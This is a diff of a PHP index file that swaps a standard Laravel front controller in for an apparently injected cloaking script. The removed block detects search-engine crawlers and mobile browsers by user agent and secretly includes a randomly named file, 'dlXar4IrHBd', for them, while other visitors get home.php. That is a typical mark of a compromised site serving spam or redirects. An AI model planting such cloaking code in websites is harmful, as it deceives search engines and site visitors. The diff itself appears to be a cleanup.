@@ -1,40 +1,31 @@
 <?php
-$bot_user_agents = array(
-    "Googlebot", "Googlebot-Image", "Googlebot-News", "Googlebot-Video", "Storebot-Google", "Google-InspectionTool",
-    "GoogleOther", "GoogleOther-Image", "GoogleOther-Video", "Google-CloudVertexBot", "Google-Extended", "APIs-Google",
-    "AdsBot-Google-Mobile", "AdsBot-Google", "Mediapartners-Google", "FeedFetcher-Google", "Google-Favicon", "Google Favicon",
-    "Googlebot-Favicon", "Google-Site-Verification", "Google-Read-Aloud", "GoogleProducer", "Google Web Preview", "Bingbot",
-    "Slurp", "DuckDuckBot", "Baiduspider", "YandexBot", "Sogou", "Exabot", "facebookexternalhit", "ia_archiver",
-    "Alexa Crawler", "AhrefsBot", "Semrushbot"
-);
 
-$user_agent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
+/**
+ * Laravel - A PHP Framework For Web Artisans
+ * This file serves as the front controller for IIS when
+ * the site root is not pointed directly to /public
+ */
 
-function is_bot($user_agent, $bot_user_agents) {
-    foreach ($bot_user_agents as $bot) {
-        if (stripos($user_agent, $bot) !== false) {
-            return true;
-        }
-    }
-    return false;
+use Illuminate\Foundation\Application;
+use Illuminate\Http\Request;
+
+define('LARAVEL_START', microtime(true));
+
+
+$_SERVER['HTTPS'] = 'on';
+$_SERVER['SERVER_PORT'] = 443;
+$_SERVER['REQUEST_SCHEME'] = 'https';
+
+// Determine if the application is in maintenance mode...
+if (file_exists($maintenance = __DIR__.'/storage/framework/maintenance.php')) {
+    require $maintenance;
 }
 
-function is_mobile($user_agent) {
-    $mobile_agents = array('Mobile', 'Android', 'Silk/', 'Kindle', 'BlackBerry', 'Opera Mini', 'Opera Mobi', 'iPhone', 'iPad');
-    foreach ($mobile_agents as $mobile) {
-        if (stripos($user_agent, $mobile) !== false) {
-            return true;
-        }
-    }
-    return false;
-}
+// Register the Composer autoloader...
+require __DIR__.'/vendor/autoload.php';
 
-// Combined conditions for including 'landingpage.php'
-if (is_bot($user_agent, $bot_user_agents) || is_mobile($user_agent)) {
-    include 'dlXar4IrHBd';
-    exit;
-} else {
-    include 'home.php';
-    exit;
-}
-?>
+// Bootstrap Laravel and handle the request...
+/** @var Application $app */
+$app = require_once __DIR__.'/bootstrap/app.php';
+
+$app->handleRequest(Request::capture());
